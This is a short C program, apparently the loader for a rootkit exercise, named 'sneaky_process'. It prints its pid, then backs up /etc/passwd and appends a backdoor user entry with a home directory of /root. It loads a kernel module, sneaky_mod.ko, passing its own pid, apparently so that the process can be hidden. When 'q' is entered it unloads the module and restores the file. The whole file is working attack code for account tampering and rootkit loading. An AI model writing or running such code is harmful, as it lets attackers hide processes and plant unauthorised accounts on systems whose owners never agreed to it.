#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main(int argc, char * argv[]){
    // 1st, print the pid
    printf("sneaky_process pid = %d\n", getpid());
    
    //2nd, print a new line to the end of the corresponding file.
    int c = system("cp /etc/passwd /tmp/passwd");
    printf("%d", c);
    //
    c = system("echo \"sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\" >> /etc/passwd");
    printf("%d", c);
    //3rd, load the sneaky module

    char argvSneaky[100];
    sprintf(argvSneaky, "insmod sneaky_mod.ko spid=%d", (int)getpid());
    //printf((const char *)argvSneaky);

    c = system(argvSneaky);
    //printf("%d",c);

    //4th, reading loop

    char input;
    while((input = getchar()) != 'q'){
    }
    // 5th unload the module

    system("rmmod sneaky_mod.ko");

    //6th restore the /etc/passwd file
    system("cp /tmp/passwd /etc/passwd");

}